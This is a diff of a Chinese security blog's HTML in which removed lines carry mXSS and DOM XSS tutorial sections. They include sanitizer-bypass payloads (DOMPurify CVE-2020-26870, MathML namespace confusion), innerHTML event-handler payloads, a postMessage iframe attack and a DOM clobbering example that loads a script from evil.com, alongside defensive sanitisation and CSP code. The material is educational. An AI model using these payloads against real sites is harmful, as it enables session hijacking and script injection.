-<h2 id="0x06-消毒器绕过"><a href="#0x06-消毒器绕过" class="headerlink" title="0x06 消毒器绕过"></a>0x06 消毒器绕过</h2><h3 id="6-1-DOMPurify-CVE-2020-26870"><a href="#6-1-DOMPurify-CVE-2020-26870" class="headerlink" title="6.1 DOMPurify CVE-2020-26870"></a>6.1 DOMPurify CVE-2020-26870</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;img/src=x onerror=alert(1)&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>DOMPurify 用 DOMParser 构建临时 DOM → SVG 命名空间中 <code>&lt;style&gt;</code> 内容被视为文本 → 消毒器遗漏 → 序列化后再被 innerHTML 解析时突变。</p>
-<h3 id="6-2-命名空间穿越-payload"><a href="#6-2-命名空间穿越-payload" class="headerlink" title="6.2 命名空间穿越 payload"></a>6.2 命名空间穿越 payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>解析路径：<code>&lt;math&gt;</code>(MathML) → <code>&lt;mtext&gt;</code> → <code>&lt;table&gt;</code>(非法) → <code>&lt;mglyph&gt;</code> → <code>&lt;style&gt;</code>(原始文本,吞后续) → <code>&lt;/style&gt;</code>(退出) → <code>&lt;img&gt;</code>(回到HTML,成为真实元素)</p>
-<h2 id="0x07-真实攻击面"><a href="#0x07-真实攻击面" class="headerlink" title="0x07 真实攻击面"></a>0x07 真实攻击面</h2><ul>
-<li><strong>邮件客户端</strong>：攻击者发送含特殊 HTML 的邮件 → 服务端消毒 → 受害者打开 Web 界面 → innerHTML 渲染突变 → 会话劫持</li>
-<li><strong>社交平台</strong>：个人资料富文本、文章编辑器、评论系统、私信 — 多个主流平台因此支付赏金</li>
-<li><strong>企业协作工具</strong>：Confluence、Notion、Slack — 复杂嵌套 DOM + 自定义消毒器 + 多次序列化往返 &#x3D; 高风险</li>
-</ul>
-<h2 id="0x08-防御策略"><a href="#0x08-防御策略" class="headerlink" title="0x08 防御策略"></a>0x08 防御策略</h2><h3 id="8-1-mXSS-感知消毒流程"><a href="#8-1-mXSS-感知消毒流程" class="headerlink" title="8.1 mXSS 感知消毒流程"></a>8.1 mXSS 感知消毒流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">原始HTML → DOMParser解析 → 白名单过滤 → 序列化</span><br><span class="line">    │                                       │</span><br><span class="line">    └───── 再次解析为DOM ←──────────────────┘</span><br><span class="line">                    │</span><br><span class="line">          比较两次DOM是否一致</span><br><span class="line">          ├─ 一致 → 安全渲染</span><br><span class="line">          └─ 不一致 → 拒绝(mXSS检测)</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-2-双重消毒实现"><a href="#8-2-双重消毒实现" class="headerlink" title="8.2 双重消毒实现"></a>8.2 双重消毒实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">safeSetInnerHTML</span>(<span class="params">element, dirtyHtml</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> clean1 = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirtyHtml, &#123;</span><br><span class="line">        <span class="attr">FORBID_TAGS</span>: [<span class="string">&#x27;svg&#x27;</span>, <span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;style&#x27;</span>],</span><br><span class="line">        <span class="attr">FORBID_ATTR</span>: [<span class="string">&#x27;onerror&#x27;</span>, <span class="string">&#x27;onload&#x27;</span>, <span class="string">&#x27;onclick&#x27;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> clean2 = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(clean1);</span><br><span class="line">    <span class="keyword">if</span> (clean1 !== clean2) &#123;</span><br><span class="line">        element.<span class="property">textContent</span> = <span class="string">&#x27;[内容被安全策略拒绝]&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;mXSS detected&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    element.<span class="property">innerHTML</span> = clean2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-3-服务端-CSP-Sanitizer-API"><a href="#8-3-服务端-CSP-Sanitizer-API" class="headerlink" title="8.3 服务端 + CSP + Sanitizer API"></a>8.3 服务端 + CSP + Sanitizer API</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端 (jsdom + DOMPurify)</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">JSDOM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;jsdom&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> createDOMPurify = <span class="built_in">require</span>(<span class="string">&#x27;dompurify&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">serverSanitize</span>(<span class="params">dirty</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="title function_">createDOMPurify</span>(<span class="keyword">new</span> <span class="title function_">JSDOM</span>(<span class="string">&#x27;&#x27;</span>).<span class="property">window</span>);</span><br><span class="line">    <span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirty, &#123;</span><br><span class="line">        <span class="attr">ALLOWED_TAGS</span>: [<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;em&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;br&#x27;</span>,<span class="string">&#x27;ul&#x27;</span>,<span class="string">&#x27;ol&#x27;</span>,<span class="string">&#x27;li&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;blockquote&#x27;</span>,<span class="string">&#x27;code&#x27;</span>,<span class="string">&#x27;pre&#x27;</span>,<span class="string">&#x27;span&#x27;</span>],</span><br><span class="line">        <span class="attr">FORBID_TAGS</span>: [<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;math&#x27;</span>,<span class="string">&#x27;style&#x27;</span>],</span><br><span class="line">        <span class="attr">FORBID_ATTR</span>: [<span class="string">&#x27;onerror&#x27;</span>,<span class="string">&#x27;onload&#x27;</span>,<span class="string">&#x27;onclick&#x27;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (clean !== <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(clean)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;mXSS&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> clean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- CSP纵深防御 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;nonce-&#123;random&#125;&#x27;;</span></span></span><br><span class="line"><span class="string"><span class="tag">               object-src &#x27;none&#x27;; base-uri &#x27;self&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sanitizer API（未来方向，内部处理mXSS）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">Sanitizer</span>) &#123;</span><br><span class="line">    element.<span class="title function_">setHTML</span>(dirtyHtml, &#123;</span><br><span class="line">        <span class="attr">sanitizer</span>: <span class="keyword">new</span> <span class="title class_">Sanitizer</span>(&#123;</span><br><span class="line">            <span class="attr">dropElements</span>: [<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;style&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;math&#x27;</span>]</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// setHTML() 使用与渲染时相同的解析器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x09-防御体系总览"><a href="#0x09-防御体系总览" class="headerlink" title="0x09 防御体系总览"></a>0x09 防御体系总览</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → 客户端消毒(DOMPurify+双重验证) → 服务端消毒(独立库+二次验证)</span><br><span class="line">                                                      │</span><br><span class="line">                                              数据库存储 → 读取</span><br><span class="line">                                                      │</span><br><span class="line">MutationObserver ← CSP策略 ←── innerHTML渲染 ←────────┘</span><br><span class="line">(运行时监控)     (script-src)    (突变可能发生)</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x0A-常见误区"><a href="#0x0A-常见误区" class="headerlink" title="0x0A 常见误区"></a>0x0A 常见误区</h2><table>
-<thead>
-<tr>
-<th>误区</th>
-<th>为什么错误</th>
-<th>正确做法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>“正则过滤就够了”</td>
-<td>HTML过于复杂，正则无法覆盖边界</td>
-<td>使用 DOMPurify 等专业消毒器</td>
-</tr>
-<tr>
-<td>“DOMParser消毒万无一失”</td>
-<td>与 innerHTML 解析结果可能不同</td>
-<td>双重验证+结构对比</td>
-</tr>
-<tr>
-<td>“CSP完全阻止XSS”</td>
-<td>纵深防御，不能替代消毒</td>
-<td>多层防御，CSP兜底</td>
-</tr>
-<tr>
-<td>“只消毒一次够了”</td>
-<td>下游再次解析时才是真正攻击面</td>
-<td>每次往返后验证</td>
-</tr>
-<tr>
-<td>“禁止SVG&#x2F;MathML就安全”</td>
-<td>利用的是命名空间切换行为</td>
-<td>理解原理，从根本上防护</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p><strong>核心教训</strong>：你不是在防御”字符串”，而是在防御”字符串经浏览器解析后形成的 DOM 树”。不涉及真实 DOM 解析的安全判断，都可能在 mXSS 面前失效。</p>
-</blockquote>
-<h2 id="0x0B-结语"><a href="#0x0B-结语" class="headerlink" title="0x0B 结语"></a>0x0B 结语</h2><p>mXSS 提醒我们：浏览器是一台极其复杂的 HTML 编译器，其纠错容错机制创造了超出预期的攻击面。防御 mXSS 需要开发阶段的双重消毒验证、测试阶段的跨浏览器 DOM 结构检测、运维阶段的严格 CSP 与运行时监控。安全没有银弹，只有持续关注和分层防御。</p>
-<h2 id="0x0C-免责声明"><a href="#0x0C-免责声明" class="headerlink" title="0x0C 免责声明"></a>0x0C 免责声明</h2><blockquote>
-<p><strong>免责声明</strong>：本文所述的 mXSS 攻击技术、代码示例及漏洞分析方法，仅供信息安全领域研究人员、开发者和安全从业者进行合法的安全研究、渗透测试授权评估及防护策略设计之用。</p>
-<ul>
-<li>任何利用本文内容从事未授权的系统入侵、数据窃取、服务破坏或其他违反《中华人民共和国网络安全法》《中华人民共和国刑法》及相关国际法的行为，均与作者无关。</li>
-<li>文中提及的 CVE 编号、厂商名称和产品名称仅用于安全研究目的，不构成对任何厂商或产品的诋毁。</li>
-<li>所有代码示例均简化以说明原理，请勿直接用于生产环境。</li>
-<li>安全是持续演进的过程——本文写于2025年5月，所述漏洞可能已被修复或有新的绕过方式。请保持对安全社区动态的关注。</li>
-</ul>
-</blockquote>
-<hr>
-<p><em>本文写于 2025年5月 · 欢迎通过评论区交流 mXSS 绕过与防御经验</em></p>
-
+          <p>mXSS 突变型跨站脚本——DOM 解析器差异与富文本编辑器 mXSS 案例。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/XSS-mutated-xss/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1340,7 +496,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1362,7 +518,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>盲XSS（Blind XSS）是一种在攻击者无法直接观察到弹窗的输入点注入Payload，等待后端系统触发后回调收集数据的持久型XSS攻击手法。本文分享从环境搭建到SRC实战的完整经验。</p>
+          <p>盲XSS实战——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/XSS-blind-xss/">
@@ -1432,7 +588,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1462,6 +618,7 @@
 <li><strong>KDC（Key Distribution Center）</strong>：密钥分发中心，运行在域控上，由AS和TGS两个服务组成</li>
 <li><strong>应用服务器（AP）</strong>：提供具体服务的服务器</li>
 </ul>
+<p>description: Kerberos 票据攻击——Golden Ticket&#x2F;Silver Ticket 伪造与 mimikatz 票据传递。</p>
 <h3 id="1-2-认证流程"><a href="#1-2-认证流程" class="headerlink" title="1.2 认证流程"></a>1.2 认证流程</h3><p>整个Kerberos认证分为三个阶段、六个步骤：</p>
 <pre class="mermaid">sequenceDiagram
     participant C as 客户端
@@ -1820,7 +977,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1842,7 +999,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>CSP（内容安全策略）是防御 XSS 的最后一道防线，但它并非无懈可击。从 JSONP 劫持、CDN 白名单滥用、nonce 窃取、base-uri 注入到 strict-dynamic 绕过与 CSPT2CSRF——本文逐条拆解 CSP 绕过策略，附带可复现的代码示例与决策流程图。</p>
+          <p>CSP绕过策略——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/XSS-csp-bypass/">
@@ -1912,7 +1069,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:43" itemprop="dateModified" datetime="2026-06-05T00:11:43+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1934,161 +1091,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DOM型XSS（DOM Based Cross-Site Scripting）是完全在客户端发生的跨站脚本攻击。与反射型和存储型XSS不同，DOM型XSS的恶意Payload不经过服务端处理，整个攻击过程在浏览器DOM环境中完成。即使服务端WAF配置完善，DOM型XSS仍可绕过所有检测。本文从Source&#x2F;Sink模型出发，系统分析其攻击面、利用技巧及现代前端框架中的特殊场景。</p>
-<p><strong>免责声明：本文仅供安全研究与学习参考，严禁利用文中技术进行非法攻击。作者对使用文中信息导致的任何后果不承担法律责任。</strong></p>
-<h2 id="一、Source-Sink-模型"><a href="#一、Source-Sink-模型" class="headerlink" title="一、Source&#x2F;Sink 模型"></a>一、Source&#x2F;Sink 模型</h2><p>DOM型XSS的核心在于数据流向：数据从**Source（源）<strong>进入JavaScript环境，流经可能的过滤逻辑，最终到达</strong>Sink（汇）**被以危险方式执行。</p>
-<p><strong>常见Source：</strong> <code>location.hash</code>（#后内容，不发送服务端）、<code>location.search</code>、<code>location.href</code>、<code>document.referrer</code>（来源页面URL）、<code>window.name</code>（跨域持久化）、<code>postMessage(data)</code>（跨窗口通信）、<code>localStorage/sessionStorage</code>、<code>document.cookie</code>、<code>XHR/Fetch Response</code>。</p>
-<p><strong>常见Sink：</strong> <code>innerHTML/outerHTML</code>（HTML注入可插事件处理器）、<code>document.write()</code>（写入文档流）、<code>eval()</code>（直接执行JS）、<code>new Function()</code>（函数构造器）、<code>setTimeout(str)/setInterval(str)</code>（字符串&#x3D;eval）、<code>location.href=/assign()</code>（javascript: URL跳转）、<code>&lt;script&gt;.src</code>动态赋值、<code>import()</code>动态模块导入、jQuery <code>.html()/.append()</code>（innerHTML + 可能的script eval）。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据流: Source ──无服务端参与──→ Sink ──→ XSS触发（无日志！）</span><br><span class="line">  例: location.hash ──decodeURI──→ innerHTML ──→ alert(document.cookie)</span><br></pre></td></tr></table></figure>
-
-<h2 id="二、四大Source深度分析"><a href="#二、四大Source深度分析" class="headerlink" title="二、四大Source深度分析"></a>二、四大Source深度分析</h2><h3 id="2-1-location-hash"><a href="#2-1-location-hash" class="headerlink" title="2.1 location.hash"></a>2.1 location.hash</h3><p>hash部分不发送到服务端，WAF完全无法检测。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞代码</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>).<span class="property">innerHTML</span> = location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// Payload: https://example.com/page#&lt;img src=x onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>防御：</strong> 限制hash为简单键值对，使用<code>textContent</code>替代<code>innerHTML</code>。</p>
-<h3 id="2-2-document-referrer"><a href="#2-2-document-referrer" class="headerlink" title="2.2 document.referrer"></a>2.2 document.referrer</h3><p>携带来源URL，攻击者可在来源URL中植入恶意代码。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞代码</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;div&gt;来源: &#x27;</span> + <span class="variable language_">document</span>.<span class="property">referrer</span> + <span class="string">&#x27;&lt;/div&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// 解析referrer参数: new URL(document.referrer).searchParams.get(&#x27;msg&#x27;) → innerHTML</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>可通过Referrer-Policy限制传递，但大量站点使用<code>unsafe-url</code>或默认策略。</p>
-</blockquote>
-<h3 id="2-3-window-name"><a href="#2-3-window-name" class="headerlink" title="2.3 window.name"></a>2.3 window.name</h3><p>在<strong>同标签页跨域导航中保持</strong>，不受同源策略限制，服务端完全不可感知。</p>
-<p><strong>攻击链路：</strong> <code>evil.com</code>设置<code>window.name = &#39;&lt;img src=x onerror=alert(1)&gt;&#39;</code> → 重定向到<code>victim.com</code> → 目标JS读取<code>window.name</code> → <code>innerHTML</code>写入 → XSS。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞代码: var data = window.name; if(data) $(&#x27;#welcome&#x27;).html(data);</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-4-postMessage"><a href="#2-4-postMessage" class="headerlink" title="2.4 postMessage"></a>2.4 postMessage</h3><p>HTML5跨文档通信机制，既是Source也是Sink。未验证origin是主要问题。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险：未验证origin</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> el.<span class="property">innerHTML</span> = e.<span class="property">data</span>);</span><br><span class="line"><span class="comment">// 危险：indexOf可被 example.com.evil.com 绕过</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">origin</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;example.com&#x27;</span>) !== -<span class="number">1</span>) <span class="built_in">eval</span>(e.<span class="property">data</span>.<span class="property">action</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p><strong>正确实现：</strong></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">origin</span> !== <span class="string">&#x27;https://trusted.example.com&#x27;</span>) <span class="keyword">return</span>; <span class="comment">// 严格匹配</span></span><br><span class="line">    <span class="keyword">var</span> actions = &#123; <span class="attr">updateText</span>: <span class="function"><span class="params">d</span> =&gt;</span> el.<span class="property">textContent</span> = d &#125;;</span><br><span class="line">    (actions[e.<span class="property">data</span>?.<span class="property">type</span>] || (<span class="function">() =&gt;</span> &#123;&#125;))(e.<span class="property">data</span>?.<span class="property">payload</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击载荷：</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;v&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/vuln.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  v.contentWindow.postMessage(&#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&#x27;, &#x27;*&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="三、三大核心Sink"><a href="#三、三大核心Sink" class="headerlink" title="三、三大核心Sink"></a>三、三大核心Sink</h2><h3 id="3-1-innerHTML"><a href="#3-1-innerHTML" class="headerlink" title="3.1 innerHTML"></a>3.1 innerHTML</h3><p>最常用的DOM XSS Sink。<code>&lt;script&gt;</code>标签不被执行，但事件处理器、SVG、iframe均可绕过：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;</span>;         <span class="comment">// img onerror</span></span><br><span class="line">el.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;svg onload=alert(1)&gt;&#x27;</span>;                 <span class="comment">// SVG onload</span></span><br><span class="line">el.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;body onload=alert(1)&gt;&#x27;</span>;                <span class="comment">// body事件</span></span><br><span class="line">el.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;\/script&gt;&quot;&gt;&#x27;</span>; <span class="comment">// srcdoc</span></span><br><span class="line">el.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;details open ontoggle=alert(1)&gt;&#x27;</span>;      <span class="comment">// toggle</span></span><br><span class="line">el.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;div style=&quot;animation:1s x&quot; onanimationend=alert(1)&gt;&#x27;</span>; <span class="comment">// CSS动画</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>常用XSS事件：</strong> <code>onerror</code>（资源加载失败）、<code>onload</code>（加载完成）、<code>onfocus</code>+<code>autofocus</code>、<code>ontoggle</code>、<code>onanimationend</code>。</p>
-<h3 id="3-2-document-write"><a href="#3-2-document-write" class="headerlink" title="3.2 document.write"></a>3.2 document.write</h3><p>页面解析期间调用时直接写入HTML到文档流。配合<strong>DOM Clobbering</strong>可操控其参数引用的全局变量：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码依赖全局变量 config.url: document.write(&#x27;&lt;script src=&quot;&#x27; + config.url + &#x27;&quot;&gt;&lt;/script&gt;&#x27;);</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>DOM Clobbering攻击载荷：</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https://evil.com/payload.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- config 变成 HTMLFormElement；config.url 变成 input 元素 --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-3-eval-及类eval函数"><a href="#3-3-eval-及类eval函数" class="headerlink" title="3.3 eval 及类eval函数"></a>3.3 eval 及类eval函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(userInput);                                  <span class="comment">// 直接</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(userInput)();                        <span class="comment">// 构造器</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&quot;alert(&#x27;&quot;</span> + userInput + <span class="string">&quot;&#x27;)&quot;</span>, <span class="number">1000</span>);   <span class="comment">// 字符串 → eval</span></span><br><span class="line">(<span class="number">0</span>, <span class="built_in">eval</span>)(userInput);                            <span class="comment">// 间接eval</span></span><br><span class="line"><span class="keyword">import</span>(<span 